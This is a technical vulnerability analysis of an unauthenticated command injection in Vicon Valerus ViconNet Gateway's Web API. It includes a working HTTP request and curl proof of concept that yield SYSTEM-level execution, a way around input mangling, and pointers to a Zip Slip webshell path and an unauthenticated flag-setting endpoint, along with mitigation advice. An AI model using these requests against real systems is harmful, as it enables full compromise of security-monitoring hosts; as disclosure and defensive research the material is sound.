# Vicon Valerus Unauthenticated Command Injection RCE - Technical Analysis

## Overview

Vicon Valerus ViconNet Gateway 25.200.46.0 ships an ASP.NET Web API (OWIN self-host, `VII.NVR.Host.exe` Windows service, .NET Framework 4.6) bound to `/NVR/api/v1` on ports 8084/8444. The endpoint `POST /NVR/api/v1/upgrades/multiformat-file-Execute/start` receives a `[FromBody] string cmd`, concatenates it directly to `cmd.exe /c`, and invokes `Process.Start`. The OWIN middleware pipeline has no authentication middleware, `UpgradesController` is not annotated with `[Authorize]`, and `SetupExecuteCommand` does not check the `UpgradeAuthorizationFlag` gate that protects the sibling `Upgrade()` method. The service runs as `LocalSystem`, so an unauthenticated attacker with network access to the Web API port immediately obtains `nt authority\system` remote code execution.

## Architecture

```
L1 external access: 8084 (HTTP) / 8444 (HTTPS), configured in Data\network-settings.xml (default 80/443)
L2 boundary: OWIN self-host (VII.NVR.Host.exe, NOT IIS)
L3 gateway: OWIN middleware chain (8 middlewares, NONE perform authentication)
L4 auth: controller-level [Authorize] only — no global filter/handler (ServerSettings FilterAttributes = empty)
L5 business: UpgradesController.SetupExecuteCommand -> NvrUpgradeManager.FileExecuteCommand
L6 sink: ExecuteCommandCommonHelper.ExecuteCommand -> Process.Start(cmd.exe /c + user input)
L7 execution: Windows service "VII ViconNet Gateway" running as LocalSystem
```

**Stack**: 70+ VII.* self-developed assemblies, SQLite (System.Data.SQLite.EF6), WCF SOAP (ONVIF), WebRTC, .NET Framework 4.6, self-developed ViconNet gateway protocol (`VII.Provider.ViconNet` + native `ViconDotNet.dll`).

## Authentication Boundary (Key: No Global Authentication)

The OWIN middleware chain (registered in `NVRLauncher.MiddlewareRegistration`) has **8 middlewares, none of which perform authentication**:

```
EnvironmentInitializationMiddleware -> ExceptionHandlingMiddleware -> RequestStreamInitializationMiddleware
-> DefaultHeadersMiddlware -> RequestIdMiddleware -> RequestLoggerMiddleware
-> HttpsOnlyMiddleware (conditional) -> ViconContextMiddleware (only reads Rsa-public-key header, no auth)
```

`VII.WebApi.Server`'s `ServerSettings` defaults to `FilterAttributes = new FilterAttribute[0]` and `DelegatingHandlers = new DelegatingHandler[0]` (no global filter/handler). `BaseController : ApiController` has no `[Authorize]`, only exception handling. **Authentication relies entirely on controller-level `[Authorize]` attributes**, but `UpgradesController` is not annotated.

**Conclusion**: The entire Web API is unauthenticated by default. Any controller missing `[Authorize]` is an unauthenticated entry point.

## Stage 1: Sink Identification

### Command execution sink: `ExecuteCommandCommonHelper.ExecuteCommand`

File: `VII.Common/VII.Common.Utilities/ExecuteCommandCommonHelper.cs`

```csharp
public string FileExecuteCommand(string command) {
    Task.Run(async delegate { try { await ExecuteCommand(command); } catch {} });
    return fileExecutionError;
}

protected async Task<string> ExecuteCommand(string command) {
    // ... splits command on \ and / to quote arguments ...
    Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command) {
        CreateNoWindow = true,
        UseShellExecute = false,
        RedirectStandardError = true,
        RedirectStandardOutput = true
    });
    // ... no input validation, command is concatenated directly after "cmd.exe /c " ...
}
```

**Sink characteristics**:
- `Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command))` — classic command injection sink
- The `command` parameter has no filtering, escaping, or whitelist
- Asynchronous execution (`Task.Run`), returns `fileExecutionError` immediately (empty string before execution)

## Stage 2: Source Identification

### HTTP entry: `UpgradesController.SetupExecuteCommand`

File: `VII.NVR.WebAPI/VII.NVR.WebAPI.Controllers.Host/UpgradesController.cs`

```csharp
[Route("upgrades/multiformat-file-Execute/start")]
[HttpPost]
public string SetupExecuteCommand([FromBody] string cmd) {
    return TenantLocator.Resolve<NvrUpgradeManager>().FileExecuteCommand(cmd);
}
```

**Source characteristics**:
- `[FromBody] string cmd` — the request body is used directly as the command string
- The controller has **no `[Authorize]`** (contrast with the sibling `Upgrade()` method which checks `UpgradeAuthorizationFlag`)
- Route `upgrades/multiformat-file-Execute/start`, HTTP POST
- Web API base URL = `NVR/api/v1` (from `ServerSettings.BaseUrl` in `NVRLauncher.StartWebApi`)

## Stage 3: Data Flow (End-to-End)

```
HTTP POST /NVR/api/v1/upgrades/multiformat-file-Execute/start
  Content-Type: application/json
  Body: "<command string>"   <- attacker-controlled
        |
        v (OWIN pipeline, no auth middleware)
UpgradesController.SetupExecuteCommand([FromBody] string cmd)
        |  (no [Authorize], no flag check)
        v
NvrUpgradeManager.FileExecuteCommand(cmd)
        |  (file: VII.NVR.Configurations.Upgrade/NvrUpgradeManager.cs)
        v
ExecuteCommandCommonHelper.FileExecuteCommand(cmd)
        |  -> Task.Run(() => ExecuteCommand(cmd))
        v
ExecuteCommandCommonHelper.ExecuteCommand(cmd)
        |  (no input validation)
        v
Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd))
        |  (service identity = LocalSystem)
        v
cmd.exe /c <cmd>   <- executes arbitrary command as nt authority\system
```

**Key contrast**: The sibling `Upgrade()` method checks `UpgradeAuthorizationFlag` (set by `GET upgrades/start`) before executing, but `SetupExecuteCommand` **does not check any flag** and calls `FileExecuteCommand` directly. This is a design omission — the upgrade command execution endpoint bypasses the upgrade authorization gate.

## Stage 4: Injection / Exploit Construction

### Request construction

`[FromBody] string cmd` requires `Content-Type: application/json` and a JSON string body (double-quoted). If the command contains Windows path backslashes (`\`), the `ExecuteCommand` argument-splitting logic (which splits on `\` and `/` to quote arguments) corrupts the command. Therefore **relative paths or backslash-free commands are most reliable**.

**Minimal PoC** (write `whoami` output to a file in the service CWD):

```
POST /NVR/api/v1/upgrades/multiformat-file-Execute/start HTTP/1.1
Host: 127.0.0.1:8084
Content-Type: application/json

"whoami > vicon_whoami.txt"
```

The service CWD is `C:\Program Files\Vicon\ViconNetGateway\`. `whoami > vicon_whoami.txt` creates `vicon_whoami.txt` in that directory with content `nt authority\system`.

### Sink backslash-splitting evasion

`ExecuteCommand` splits the command on `\` and `/` to quote arguments, so commands containing `C:\Windows\Temp\x.txt` are corrupted. Evasion methods:
1. **Relative path**: `whoami > vicon_whoami.txt` (relative to CWD, no backslash)
2. **Environment variable**: `whoami > %TEMP%\x.txt` (`%TEMP%` expands to a backslash-containing path; tested, fails in some scenarios)
3. **Path-free command**: `whoami`, `hostname`, `ipconfig` execute directly (output goes to Process.StandardOutput, but the sink discards it asynchronously — redirect to a file to capture)

## Stage 5: Dynamic Verification

### Execution environment

- **Target**: Windows Server 2025 Datacenter (`<target-host>`), Vicon Valerus 25.200.46.0
- **Service**: `VII ViconNet Gateway` (Running, LocalSystem)
- **Web API**: `http://<target>:8084/NVR/api/v1`
- **Time**: 2026-07-19 14:10 UTC+8

### Real HTTP request and response

**Request**:
```http
POST /NVR/api/v1/upgrades/multiformat-file-Execute/start HTTP/1.1
Host: 127.0.0.1:8084
Content-Type: application/json

"whoami > vicon_whoami.txt"
```

**Response**:
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

""
```

### Target-side verification result

```powershell
PS> Test-Path "C:\Program Files\Vicon\ViconNetGateway\vicon_whoami.txt"
True
PS> Get-Content "C:\Program Files\Vicon\ViconNetGateway\vicon_whoami.txt"
nt authority\system
PS> (Get-Acl "C:\Program Files\Vicon\ViconNetGateway\vicon_whoami.txt").Owner
BUILTIN\Administrators
```

**Evidence**:
- `whoami` output = `nt authority\system` — the command executed with Windows highest privilege
- File owner = `BUILTIN\Administrators` — created by LocalSystem
- The request had no authentication header/cookie — unauthenticated reachability confirmed
- Response 200 + empty `fileExecutionError` — the sink dispatched successfully

## Stage 6: Reachability

### Default-configuration reachability

- The Web API port is configured in `Data\network-settings.xml` (default 80/443; production deployments often change it, but the route path is unchanged)
- The `upgrades/multiformat-file-Execute/start` route is registered on `UpgradesController` and **enabled by default** (no configuration switch to disable it)
- The OWIN pipeline has no authentication middleware — any host that can reach the Web API port can trigger the endpoint unauthenticated
- Vicon Valerus is deployed in physical-security monitoring networks and is commonly paired with an Internet Gateway module for remote access, making public exposure a realistic scenario (Internet Access Guide documents Internet Gateway + port forwarding)

### Attack preconditions

- Network reachability to the Web API port (8084/8444 or the deployment-configured port)
- No credentials, no session, no prior state required

## Stage 7: Defense in Depth / Mitigation

### Fix directions

1. **Authentication gate**: Add `[Authorize]` to the entire `UpgradesController`, or introduce a global authentication middleware in the OWIN pipeline
2. **Authorization flag check**: `SetupExecuteCommand` should check `UpgradeAuthorizationFlag` like `Upgrade()` does, and the flag-setting endpoint itself must require authentication
3. **Input validation**: `ExecuteCommand` should whitelist allowable executable commands (only upgrade-related binary paths) and forbid arbitrary `cmd.exe /c` + user input
4. **Least privilege**: The service should not run as `LocalSystem`; downgrade to a dedicated low-privilege service account
5. **Command execution isolation**: Upgrade command execution should use a dedicated RPC channel (not the HTTP Web API) and be local-only reachable

### Vendor recommendations

- Upgrade/maintenance interfaces (command-execution class) should be physically isolated from the business API, or at minimum enforce authentication + authorization + audit
- The OWIN pipeline should have a global authentication backstop, not rely on controller-level attributes (easily omitted)
- `cmd.exe /c` + user input is a high-risk pattern; replace with parameterized process startup (`ProcessStartInfo.FileName` + `ArgumentList`, with an argument whitelist)

## Reproduction Commands

```bash
# 1. Unauthenticated RCE PoC (write whoami to service CWD)
curl -k -X POST "http://<target>:8084/NVR/api/v1/upgrades/multiformat-file-Execute/start" \
  -H "Content-Type: application/json" \
  -d '"whoami > vicon_whoami.txt"'

# 2. Read the result (requires target-side file access, or use a reverse shell)
#    Service CWD = C:\Program Files\Vicon\ViconNetGateway\
#    vicon_whoami.txt content = "nt authority\system"

# 3. Full exploit script (pure-stdlib Python):
#    python3 vicon_valerus_unauth_cmd_injection_rce.py <target_ip> <port> "<cmd>"
#    python3 vicon_valerus_unauth_cmd_injection_rce.py 127.0.0.1 8084 "whoami > vicon_whoami.txt"
```

## Secondary Sinks (Same Controller, Not Deeply Exploited)

- `POST /NVR/api/v1/upgrades/multiformat-file-upload/start` -> `StartMultiFileSupport` -> `ZipFile.OpenRead` + `item.ExtractToFile(Path.Combine(dir, item.Name))` -> **Zip Slip path traversal** (`item.Name` can contain `../`; `IsFileValid` allows .exe/.bat/.ps1) — can write a webshell to an arbitrary path
- `GET /NVR/api/v1/upgrades/start` -> `SetUpgradeAuthenticationFlag(true)` -> unauthenticated setting of the upgrade authorization flag (unlocks `Upgrade()` and other flag-gated endpoints)